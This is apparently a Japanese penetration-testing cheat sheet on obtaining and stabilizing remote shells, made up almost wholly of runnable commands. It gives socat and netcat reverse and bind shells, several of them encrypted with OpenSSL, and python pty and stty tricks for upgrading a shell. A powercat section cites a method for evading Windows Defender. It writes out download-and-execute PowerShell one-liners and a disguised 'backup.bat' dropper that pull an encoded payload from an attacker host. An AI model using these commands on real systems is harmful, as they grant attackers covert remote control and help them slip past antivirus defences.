## 設定

### シェル安定化

#### 1. python

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

```shell
# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg
```

```shell
#（終了後）エコー無効にして入力非表示になっているので
reset
```

##### ターミナルサイズ

エディタなどの全画面塗りつぶし系のプログラムを開くとき

```shell
# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 54
stty cols 235
```

#### 2. rlwrap

Windows でも簡単に安定化できる。Linux の場合は、stty raw も必要。

```shell
rlwrap nc -lvnp <port>
```

#### 3. Socat

デフォルトで入っているツールではないので配置が必要

```shell
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

## Socat

### リバースシェル

```shell
# listen
socat TCP-L:<port> -

# connect
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### バインドシェル

```shell
# listen
socat TCP-L:<PORT> EXEC:"bash -li"

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# connect
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Socat の安定化

ターゲットが Linux の場合のみ

```shell
socat TCP-L:<port> FILE:`tty`,raw,echo=0

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### 暗号化通信

```shell
# 攻撃側で証明書生成
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
# マージ
cat shell.key shell.crt > shell.pem

# リバースシェルリスナー
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# 接続
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

```shell
# バインドシェルの場合
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

### powercat

[PowercatでWindows Defenderのリバースシェル検出を回避する](https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1)

1. powercat.ps1 をダウンロードし、powercat を実行して、エンコードされたペイロード ファイル (/tmp/shell-443.txt) を作成

```ps
LHOST=192.168.62.161 
LPORT=443 
rshell=shell-443.txt 
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/$rshell
```

2. ダウンロードさせて実行させるバッチを作成

```ps
LHOST=192.168.62.161 
LPORT_web=80 
rshell=shell-443.txt 
echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${LPORT_web}/${rshell}');iex 'powershell -E \$code'" >/tmp/backup.bat
```


## バインドシェル

リバースシェルの何が「逆」かというとバインドシェルの逆方向という意味であり、バインドシェルはターゲット側で Listen する。

```shell
# ターゲット側
nc -lvnp <port> -e "cmd.exe"
# 攻撃側
nc MACHINE_IP <port>

# linux
nc -lvnp <port> -e /bin/bash
```
